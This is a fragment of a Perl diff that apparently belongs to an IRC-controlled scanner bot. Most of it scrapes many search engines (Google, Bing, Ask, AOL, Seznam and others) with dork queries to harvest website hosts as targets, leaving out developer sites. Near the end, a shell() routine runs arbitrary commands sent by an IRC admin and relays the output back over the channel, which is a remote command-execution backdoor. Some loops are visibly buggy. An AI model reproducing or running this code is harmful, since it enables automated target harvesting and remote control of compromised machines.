+		my @doms = ("ae","com.af","com.ag","off.ai","am","com.ar","as","at","com.au","az","ba","com.bd","be","bg","bi","com.bo","com.br","bs","co.bw","com.bz","ca","cd","cg","ch","ci","co.ck","cl","com.co","co.cr","com.cu","de","dj","dk","dm","com.do","com.ec","es","com.et","fi","com.fj","fm","fr","gg","com.gi","gl","gm","gr","com.gt","com.hk","hn","hr","co.hu","co.id","ie","co.il","co.im","co.in","is","it","co.je","com.jm","jo","co.jp","co.ke","kg","co.kr","kz","li","lk","co.ls","lt","lu","lv","com.ly","mn","ms","com.mt","mu","mw","com.mx","com.my","com.na","com.nf","com.ni","nl","no","com.np","nr","nu","co.nz","com.om","com.pa","com.pe","com.ph","com.pk","pl","pn","com.pr","pt","com.py","ro","ru","rw","com.sa","com.sb","sc","se","com.sg","sh","sk","sn","sm","com.sv","co.th","com.tj","tm","to","tp","com.tr","tt","com.tw","com.ua","co.ug","co.uk","com.uy","uz","com.vc","co.ve","vg","co.vi","com.vn","vu","ws","co.za","co.zm");
+		my $num = 10; my $max = 1000; my $p; my $token;
+		my $go  = "http://www.google.com/search?q=".&key($key)."&filter=0&start=".$p;
+		my $gl = &get_content($go);
+		while ($gl =~ m/href=\"\/search?q=(.*?);ei=(.*?)&amp;start=(.*?)\" id=\"pnnext\"/g){ my $token = $2;}
+		foreach my $domain (@doms) { 
+			$dom = $doms[rand(scalar(@doms))];
+			for ($p=10; $p<=$max; $p+=$num) {
+				my $search = "http://www.google.".$dom."/search?q=".&key($key)."&ei=".$token."&start=".$p."&sa=N&filter=0";
+				my $res = &get_content($search);
+				while ($res =~ m/<h3 class=\"r\"><a href=\"(.*?):\/\/(.*?)\"/g) {
+					if ($2 !~ /google|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+						my $link = $2;
+						my @grep = &links($link); 
+						push(@list,@grep);
+					}
+				}
+				} return @list;
+			}
+		}
+		sub gproxy() {
+			my @list;
+			my $key = $_[0];
+			my @doms = ("com","ae","com.af","com.ag","off.ai","am","com.ar","as","at","com.au","az","ba","com.bd","be","bg","bi","com.bo","com.br","bs","co.bw","com.bz","ca","cd","cg","ch","ci","co.ck","cl","com.co","co.cr","com.cu","de","dj","dk","dm","com.do","com.ec","es","com.et","fi","com.fj","fm","fr","gg","com.gi","gl","gm","gr","com.gt","com.hk","hn","hr","co.hu","co.id","ie","co.il","co.im","co.in","is","it","co.je","com.jm","jo","co.jp","co.ke","kg","co.kr","kz","li","lk","co.ls","lt","lu","lv","com.ly","mn","ms","com.mt","mu","mw","com.mx","com.my","com.na","com.nf","com.ni","nl","no","com.np","nr","nu","co.nz","com.om","com.pa","com.pe","com.ph","com.pk","pl","pn","com.pr","pt","com.py","ro","ru","rw","com.sa","com.sb","sc","se","com.sg","sh","sk","sn","sm","com.sv","co.th","com.tj","tm","to","tp","com.tr","tt","com.tw","com.ua","co.ug","co.uk","com.uy","uz","com.vc","co.ve","vg","co.vi","com.vn","vu","ws","co.za","co.zm");
+			my $num = 10; my $max = 1000; my $p; my $token;
+			my $go  = "http://www.google.com/search?q=".&key($key)."&filter=0&start=".$p;
+			my $gl = &get_content($go);
+			while ($gl =~ m/href=\"\/search?q=(.*?);ei=(.*?)&amp;start=(.*?)\" id=\"pnnext\"/g){ my $token = $2;}
+			foreach my $domain (@doms) { 
+				$dom = $doms[rand(scalar(@doms))];
+				for ($p=10; $p<=$max; $p+=$num) {
+					my $search = $poksai."http://www.google.".$dom."/search?q=".&key($key)."&ei=".$token."&start=".$p."&sa=N&filter=0";
+					my $res = &get_content($search);
+					while ($res =~ m/<h3 class=\"r\"><a href=\"(.*?):\/\/(.*?)\"/g) {
+						if ($2 !~ /google|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+							my $link = $2;
+							my @grep = &links($link); 
+							push(@list,@grep);
+						}
+					}
+					} return @list;
+				}
+			}
+			sub walla() {
+				my @list;
+				my $key = $_[0];
+				my $num = 1; my $max = 100; my $p;
+				for ($p=1; $p<=$max; $p+=$num) {
+					my $search = "http://search.walla.co.il/?q=".&key($key)."&type=text&page=".$p;
+					my $res = &get_content($search);
+					while ($res =~ m/<h1><a href=\"(.*?):\/\/(.*?)\"/g) {
+						my $link = $2;
+						if ($link !~ /walla.co.il|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+							my @grep = &links($link); 
+							push(@list,@grep);
+						}
+					}
+				}
+				return @list;
+			}
+			sub ask() {
+				my @list;
+				my $key = $_[0];
+				my $num = 1; my $max = 100; my $p; my $token1; my $token2;
+				my $go  = "http://www.ask.com/web?q=".&key($key)."&page=".$p."&o=0&l=dir&qo=pagination";
+				my $gl = &get_content($go);
+				while ($gl =~ m/<a class=\"pagination-number-link\" href=\"(.*?)qid=(.*?)&(.*?)&qsrc=(.*?)&(.*?)\">/g){ my $token1 = $2; my $token2 = $4;}
+				for ($p=1; $p<=$max; $p+=$num) {
+					my $search = "http://www.ask.com/web?q=".&key($key)."&page=".$p."&qid=".$token1."&o=0&l=dir&qsrc=".$token2."&qo=pagination";
+					my $res = &get_content($search);
+					while ($res =~ m/href=\"(.*?):\/\/(.*?)\" onmousedown=/g) {
+						my $link = $2;
+						if ($link !~ /ask.com|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+							my @grep = &links($link); 
+							push(@list,@grep);
+						}
+					}
+				}
+				return @list;
+			}
+			sub ask2() {
+				my @list;
+				my $key = $_[0];
+				my @doms = ("de","it","fr","es","ru","nl","uk","br","pl","au","at","jp","se","mx","no","dk");
+				my $num = 1; my $max = 100; my $p; my $token1; my $token2;
+				my $go  = "http://www.ask.com/web?q=".&key($key)."&page=".$p."&o=0&l=dir&qo=pagination";
+				my $gl = &get_content($go);
+				while ($gl =~ m/<a class=\"pagination-number-link\" href=\"(.*?)qid=(.*?)&(.*?)&qsrc=(.*?)&(.*?)\">/g){ my $token1 = $2; my $token2 = $4;}
+				foreach my $domain (@doms) { $dom = $doms[rand(scalar(@doms))];
+					for ($p=1; $p<=$max; $p+=$num) {
+						my $search = "http://".$dom.".ask.com/web?q=".&key($key)."&page=".$p."&qid=".$token1."&o=0&l=dir&qsrc=".$token2."&qo=pagination";
+						my $res = &get_content($search);
+						while ($res =~ m/href=\"(.*?):\/\/(.*?)\" onmousedown=/g) {
+							if ($2 !~ /ask.com|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+								my $link = $2;
+								my @grep = &links($link); 
+								push(@list,@grep);
+							}
+						}
+						} return @list;
+					}
+				}
+				sub clusty() {
+					my @list;
+					my $key = $_[0];
+					my $num = 20; my $max = 200; my $p; my $token1; my $token2;
+					my $go  = "http://new.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty-new&query=".&key($key);
+					my $gl = &get_content($go);
+					while ($gl =~ m/class=\"listmore\" href=\"(.*?)v%3afile=(.*?)&amp;sec=(.*?)&(.*?)\">/g){ my $token1 = $2; my $token2 = $3;}
+					for ($p=20; $p<=$max; $p+=$num) {
+						my $search = "http://new.yippy.com/search?v%3aproject=clusty-new&v%3afile=".$token1."&sec=".$token2."&query=".&key($key)."&v:state=root|root-".$p."-20|0&";
+						my $res = &get_content($search);
+						while ($res =~ m/<a class=\"opener\" href=\"(.*?):\/\/(.*?)\"/g) {
+							my $link = $2;
+							if ($1 !~ /yippy.com|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+								my @grep = &links($link); 
+								push(@list,@grep);
+							}
+						}
+					}
+					return @list;
+				}
+				sub bing() {
+					my @list;
+					my $key = $_[0];
+					my $num = 10; my $max = 1000; my $p;
+					for (my $p=1; $p<=$max; $p+=$num) {
+						my $search = "http://www.bing.com/search?q=".&key($key)."&qs=n&pq=".&key($key)."&sc=0-0&sp=-1&sk=&first=".$p;
+						my $res = &get_content($search);
+						while ($res =~ m/<h2><a href=\"(.*?):\/\/(.*?)\"/g) {
+							my $link = $2;
+							if ($link !~ /google.com|microsoft.com|live.com|msn.com|bing.com|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/) {
+								my @grep = &links($link); 
+								push(@list,@grep);
+							}
+						}
+					}
+					return @list;
+				}
+				sub bing2() {
+					my @list;
+					my $key = $_[0];
+					my @doms = ("de","uk","ca","br","fr","es","it","be","nl","pt","no","dk","se","ch","nz","ru","jp","cn","kr","mx","ar","cl","au");
+					my $num = 10; my $max = 1000; my $p;
+					foreach my $domain (@doms) { $dom = $doms[rand(scalar(@doms))];
+						for (my $p=10; $p<=$max; $p+=$num) {
+							my $search = "http://www.bing.com/search?q=".&key($key)."&qs=n&pq=".&key($key)."&sc=0-0&sp=-1&sk=&cc=".$p."&rf=1&qpvt=".&key($key)."&first=".$p;
+							my $res = &get_content($search);
+							while ($res =~ m/<h2><a href=\"(.*?):\/\/(.*?)\"/g) {
+								if ($2 !~ /google.com|microsoft.com|live.com|msn.com|bing.com|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my $link = $2;
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+							} return @list;
+						}
+					}
+					sub bypass() {
+						my @list;
+						my $key = $_[0];
+						my $num = 10; my $max = 1000; my $p;
+						my $search = $bypass."?key=".&key($key)."&max=".$max;
+						my $res = &get_content($search);
+						while ($res =~ m/<h3 class=r>ambil :<a href=\"\/url?q=(.*?):\/\/(.*?)\">/g) {
+							if ($link !~ /google|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+								my $link = $2;
+								my @grep = &links($link); 
+								push(@list,@grep);
+							}
+						}
+						return @list;
+					}
+					sub uol() {
+						my @list;
+						my $key = $_[0];
+						my $num = 15; my $max = 1000; my $p;
+						for ($p=15; $p<=$max; $p+=$num) {
+							my $search = "http://busca.uol.com.br/web/?q=".&key($key)."&start=".$p;
+							my $res = &get_content($search);
+							while ($res =~ m/<dt><a href=\"(.*?):\/\/(.*?)\">/g) {
+								my $link = $2;
+								if ($link !~ /uol.com.br|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+						}
+						return @list;
+					}
+					sub seznam() {
+						my @list;
+						my $key = $_[0];
+						my $num = 10; my $max = 1000; my $p; my $token;
+						my $go  = "http://search.seznam.cz/?q=".&key($key)."&count=".$num."&from=".$num;
+						my $gl = &get_content($go);
+						while ($gl =~ m/<input type=\"hidden\" name=\"sId\" value=\"(.*?)\"/g){ my $token = $1; }
+						for ($p=10; $p<=$max; $p+=$num) {
+							my $search = "http://search.seznam.cz/?q=".&key($key)."&count=".$num."&pId=".$token."&from=".$p;
+							my $res = &get_content($search);
+							while ($res =~ m/id=\"modImgA-(.*?)\" href=\"(.*?):\/\/(.*?)\"/g) {
+								my $link = $3;
+								if ($link !~ /seznam.cz|sklik.cz|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+						}
+						return @list;
+					}
+					sub hotbot() {
+						my @list;
+						my $key = $_[0];
+						my $num = 1; my $max = 100; my $p; my $token;
+						my $go  = "http://www.hotbot.com/search/web?pn=".$num."&q=".&key($key);
+						my $gl = &get_content($go);
+						while ($gl =~ m/$('#keyvol').val('(.*?)');/g){ my $token = $1; }
+						for ($p=1; $b<=$max; $p+=$num) {
+							my $search = "http://www.hotbot.com/search/web?pn=".$p."&q=".&key($key)."&keyvol=".$token;
+							my $res = &get_content($search);
+							while ($res =~ m/<a href=\"(.*?):\/\/(.*?)\"/g) {
+								my $link = $2;
+								if ($link !~ /hotbot.com|lycos.com|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+						}
+						return @list;	
+					}
+					sub aol() {
+						my @list;
+						my $key = $_[0];
+						my $num = 1; my $max = 100; my $p; my $token;
+						my $go  = "http://search.aol.com/aol/search?enabled_terms=&s_it=comsearch&q=".&key($key);
+						my $gl = &get_content($go);
+						while ($gl =~ m/<a href=\"(.*?)oreq=(.*?)\"/g){ my $token = $1; }
+						for ($p=1; $p<=$max; $p+=$num) {
+							my $search = "http://search.aol.com/aol/search?page=".$p."&v_t=comsearch&enabled_terms=&q=".&key($key)."&s_it=comsearch&oreq=".$token;
+							my $res = &get_content($search);
+							while ($res =~ m/href=\"(.*?):\/\/(.*?)\" property=/g) {
+								my $link = $2;
+								if ($link !~ /aol.com|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+						}
+						return @list;
+					}
+					sub biglobe() {
+						my $key = $_[0];
+						my @list;
+						my $num = 10; my $max = 1000; my $p;
+						for ($p=10; $p<=$max; $p+=$num) {
+							$num += $num;
+							my $search = "http://cgi.search.biglobe.ne.jp/cgi-bin/search_bl_top?start=".$p."&ie=utf8&num=".$num."&q=".&key($key)."&lr=all&maevy=2911";
+							my $res = &get_content($search);
+							while ( $res =~ m/<h3><a href=\"(.*?):\/\/(.*?)\"/g ) {
+								my $link = $2;
+								if ($link !~ /biglobe.ne.jp|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+						}
+						return @list;
+					}
+					sub lycos() {
+						my @list;
+						my $key = $_[0];
+						my $num = 1; my $max = 100; my $p; my $token;
+						my $go  = "http://search.lycos.com/web/?q=".&key($key)."&pn=".$num;
+						my $gl = &get_content($go);
+						while ($gl =~ m/$('#keyvol').val('(.*?)');/g){ my $token = $1; }
+						for ($p=1; $b<=$max; $p+=$num) {
+							my $search = "http://search.lycos.com/web/?q=".&key($key)."&keyvol=".$token."&pn=".$p;
+							my $res = &get_content($search);
+							while ($res =~ m/<span class=\"result-url\">(.*?)<\/span>/g) {
+								my $link = $1;
+								if ($link !~ /hotbot.com|lycos.com|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+						}
+						return @list;	
+					} 
+					sub webde() {
+						my @list;
+						my $key = $_[0];
+						my $num = 1; my $max = 100; my $p;
+						for ($p=1; $p<=$max; $p+=$num) {
+							my $search = "http://suche.web.de/web?q=".&key($key)."&pageIndex=".$p."&origin=serp_pag";
+							my $res = &get_content($search);
+							while ($res =~ m/<h3><a target=\"_blank\" href=\"(.*?):\/\/(.*?)\">/g) {
+								my $link = $2;
+								if ($link !~ /web.de|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+						}
+						return @list;
+					}
+					sub crawler() {
+						my @list;
+						my $key = $_[0];
+						my $num = 10; my $max = 1000; my $p;
+						for ($p=1; $p<=$max; $p+=$num) {
+							my $search = "http://www.webcrawler.com/search/web?qsi=".$p."&q=".&key($key);
+							my $res = &get_content($search);
+							while ($res =~ m/<div class=\"resultDisplayUrl\">(.*?)<\/div>/g) {
+								my $link = $1;
+								if ($link !~ /webcrawler.com|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+						}
+						return @list;
+					}
+					sub dmoz() {
+						my @list;
+						my $key = $_[0];
+						my $num = 20; my $max = 2000; my $p;
+						for ($p=20; $p<=$max; $p+=$num) {
+							my $search = "http://www.dmoz.org/search?q=".&key($key)."&start=".$p."&type=next&all=no&cat=";
+							my $res = &get_content($search);
+							while ($res =~ m/<li class=\"\"><a href=\"(.*?):\/\/(.*?)\">/g) {
+								my $link = $1;
+								if ($link !~ /dmoz.org|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){
+									my @grep = &links($link); 
+									push(@list,@grep);
+								}
+							}
+						}
+						return @list;
+					}
+#########################################
+sub clean() {
+	my @cln = ();
+	my %visit = ();
+	foreach my $element (@_) {
+		$element =~ s/\/+/\//g;
+		next if $visit{$element}++;
+		push @cln, $element;
+	}
+	return @cln;
+}
+sub key() {
+	my $dork = $_[0];
+	$dork =~ s/ /\+/g;
+	$dork =~ s/:/\%3A/g;
+	$dork =~ s/\//\%2F/g;
+	$dork =~ s/\?/\%3F/g;
+	$dork =~ s/&/\%26/g;
+	$dork =~ s/\"/\%22/g;
+	$dork =~ s/,/\%2C/g;
+	$dork =~ s/\\/\%5C/g;
+	$dork =~ s/@/\%40/g;
+	$dork =~ s/\[/\%5B/g;
+	$dork =~ s/\]/\%5D/g;
+	$dork =~ s/\?/\%3F/g;
+	$dork =~ s/\=/\%3D/g;
+	$dork =~ s/\|/\%7C/g;
+	return $dork;
+}
+sub links() {
+	my @list;
+	my $link = $_[0];
+	my $host = $_[0];
+	my $hdir = $_[0];
+	$hdir =~ s/(.*)\/[^\/]*$/$1/;
+	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+	$host .= "/";
+	$link .= "/";
+	$hdir .= "/";
+	$host =~ s/\/\//\//g;
+	$hdir =~ s/\/\//\//g;
+	$link =~ s/\/\//\//g;
+	push(@list,$hdir,$host);
+	return @list;
+}
+#sub searchs_engines_querys($) {
+	sub search_engine_query($) {
+		my $url = $_[0];
+		$url =~ s/(.*?):\/\///;
+		my $host = $url;
+		my $query = $url;
+		my $page  = "";
+		$host =~ s/href=\"?(.*?):\/\///;
+		$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+		$query =~ s/$host//;
+		if ($query eq "") { $query = "/"; }
+		eval {
+			my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
+			print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";
+			my @pages = <$sock>;
+			$page = "@pages";
+			close($sock);
+		};
+		return $page;
+	}
+#########################################
+sub shell() {
+	my $path = $_[0];
+	my $cmd = $_[1];
+	if ($cmd =~ /cd (.*)/) {
+		chdir("$1") || &msg("$path","No such file or directory");
+		return;
+	}
+	elsif ($pid = fork) { waitpid($pid, 0); }
+	else { if (fork) { exit; } else {
+		my @output = `$cmd 2>&1 3>&1`;
+		my $c = 0;
+		foreach my $output (@output) {
+			$c++;
+			chop $output;
+			&msg("$path","$output");
+			if ($c == 5) { $c = 0; sleep 2; }
+		}
+		exit;
+		}}
+	}
+	sub isAdmin() {
+		my $status = 0;
+		my $nick = $_[0];
+		if ($nick eq $admin) { $status = 1; }
+		return $status;
+	} 
+	sub msg() {
+		return unless $#_ == 1;
+		sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
+	} 
+	sub nick() {
+		return unless $#_ == 0;
+		sendraw("NICK $_[0]");
+	} 
+	sub notice() {
+		return unless $#_ == 1;
+		sendraw("NOTICE $_[0] :$_[1]");
+	}
